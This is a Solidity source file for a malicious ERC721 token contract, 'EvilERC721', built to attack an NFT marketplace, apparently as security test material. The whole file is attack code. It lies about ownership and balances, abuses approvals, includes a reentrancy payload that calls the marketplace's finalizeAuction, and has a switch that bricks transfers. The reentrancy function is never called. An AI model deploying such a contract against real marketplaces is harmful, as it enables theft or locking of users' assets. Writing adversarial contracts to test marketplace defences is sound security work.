//SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMarketplace {
    function finalizeAuction(address nft, uint256 tokenId) external;
}

contract EvilERC721 is IERC721, IERC721Receiver {
    // Target Address
    address public immutable marketplace;
    address public attacker;

    bool internal flip;
    bool internal reentered;
    bool public bricked;

    constructor(address _marketplace) {
        marketplace = _marketplace;
        attacker = msg.sender;
    }

    /* ========== EVIL SWITCH ========== */
    function brick() external {
        bricked = true;
    }

    function supportsInterface(bytes4 interfaceId) external view override returns (bool) {
        if (bricked) return false;
        return interfaceId == type(IERC721).interfaceId || interfaceId == type(IERC165).interfaceId;
    }

    mapping(uint256 => address) internal _owners;
    mapping(address => mapping(address => bool)) internal _operatorApprovals;

    function mint(uint256 tokenId) external {
        _owners[tokenId] = msg.sender;
    }

    // Always lie about ownership
    function ownerOf(uint256 tokenId) external view override returns (address) {
        if (bricked) {
            return marketplace; // lie after escrow
        }
        return _owners[tokenId];
    }

    function approve(address, uint256) external pure override {
        revert("EVIL");
    }

    function getApproved(uint256) external pure override returns (address) {
        return address(0);
    }

    function setApprovalForAll(address operator, bool approved) external override {
        _operatorApprovals[msg.sender][operator] = approved;
    }

    /* ───────────── Approval Abuse ───────────── */

    function isApprovedForAll(
        address owner,
        address operator
    ) external view override returns (bool) {
        if (flip) return true;

        return _operatorApprovals[owner][operator];
    }

    /* ───────────── Transfers (Attack Surface) ───────────── */

    function transferFrom(address from, address to, uint256 tokenId) public override {
        if (bricked) revert("EVIL: transfer blocked");

        require(msg.sender == from || _operatorApprovals[from][msg.sender], "NOT AUTH");

        _owners[tokenId] = to;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external override {
        transferFrom(from, to, tokenId);
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata
    ) external override {
        transferFrom(from, to, tokenId);
    }

    /* ───────────── Reentrancy Payload ───────────── */

    function _attack() internal {
        if (!reentered) {
            reentered = true;
            flip = true;

            // Reenter marketplace during transfer
            IMarketplace(marketplace).finalizeAuction(address(this), 1);
        }

        revert("EVIL: transfer reverted after damage");
    }
    /* ───────────── ERC721Receiver Attack ───────────── */

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        // Flip ownership during callback
        flip = !flip;

        return IERC721Receiver.onERC721Received.selector;
    }

    /* ───────────── Balance Lies ───────────── */

    function balanceOf(address) external pure override returns (uint256) {
        return type(uint256).max; // 👿 infinite balance
    }
}
